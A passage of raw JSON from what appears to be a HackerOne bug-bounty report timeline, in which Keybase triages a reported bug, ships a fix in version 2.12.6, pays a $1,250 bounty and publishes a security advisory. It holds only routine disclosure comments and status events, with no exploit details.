doesn\u0026#39;t directly give the attacker root, it would require a further hole or manual user interaction. It is still a bug worth fixing. Thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-28T12:17:34.241Z","updated_at":"2018-12-28T12:17:34.241Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3900134,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-28T12:36:41.054Z","updated_at":"2018-12-28T12:36:41.054Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3932723,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, thanks again for this great bug report and and your research. This bug should be fixed in our latest hot-fix release, 2.12.6. It should also be fixed in master. Can you verify?\n\nOur current plan is to bounty and disclose this issue after our next release cycle (2.13.0), later this month. In the mean time, we're reaching out to all users who haven't upgraded to 2.12.6 yet and encouraging them to upgrade. We'll be in touch shortly. Thanks!","markdown_message":"\u003cp\u003eHi, thanks again for this great bug report and and your research. This bug should be fixed in our latest hot-fix release, 2.12.6. It should also be fixed in master. Can you verify?\u003c/p\u003e\n\n\u003cp\u003eOur current plan is to bounty and disclose this issue after our next release cycle (2.13.0), later this month. In the mean time, we\u0026#39;re reaching out to all users who haven\u0026#39;t upgraded to 2.12.6 yet and encouraging them to upgrade. We\u0026#39;ll be in touch shortly. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-07T01:09:50.730Z","updated_at":"2019-01-07T01:09:50.730Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3932726,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update @maxtaco. I will verify 2.12.6 tonight and report back the results.","markdown_message":"\u003cp\u003eThanks for the update \u003ca href=\"/maxtaco\"\u003e@maxtaco\u003c/a\u003e. I will verify 2.12.6 tonight and report back the results.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-07T01:13:06.194Z","updated_at":"2019-01-07T01:13:06.194Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3946524,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@maxtaco \n\nAll of the original test cases I have no longer work against 2.12.6 so the fix appears to be good. I will be doing further testing this week and will report any issues found. Thanks!","markdown_message":"\u003cp\u003e\u003ca href=\"/maxtaco\"\u003e@maxtaco\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eAll of the original test cases I have no longer work against 2.12.6 so the fix appears to be good. I will be doing further testing this week and will report any issues found. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-09T04:55:06.362Z","updated_at":"2019-01-09T04:55:06.362Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066224,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:14:11.576Z","updated_at":"2019-01-30T18:14:11.576Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mirchr","url":"/mirchr"},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066228,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:14:48.645Z","updated_at":"2019-01-30T18:14:48.645Z","actor":{"url":"/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Keybase"}},"bounty_amount":"1250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"mirchr","url":"/mirchr"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066229,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:14:59.078Z","updated_at":"2019-01-30T18:14:59.078Z","first_to_agree":true,"actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066281,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We posted this security update: https://keybase.io/docs/secadv/kb004","markdown_message":"\u003cp\u003eWe posted this security update: \u003ca title=\"https://keybase.io/docs/secadv/kb004\" href=\"/redirect?url=https%3A%2F%2Fkeybase.io%2Fdocs%2Fsecadv%2Fkb004\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://keybase.io/docs/secadv/kb004\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T18:21:01.117Z","updated_at":"2019-01-30T18:21:01.117Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066332,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @maxtaco . I noticed my last name is misspelled. It should be Mirch. Thanks!","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/maxtaco\"\u003e@maxtaco\u003c/a\u003e . I noticed my last name is misspelled. It should be Mirch. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T18:31:02.022Z","updated_at":"2019-01-30T18:31:02.022Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066341,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:33:06.586Z","updated_at":"2019-01-30T18:33:06.586Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066342,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:33:06.652Z","updated_at":"2019-01-30T18:33:06.652Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066662,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, fixed!","markdown_message":"\u003cp\u003eSorry, fixed!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T18:42:43.389Z","updated_at":"2019-01-30T18:42:43.389Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}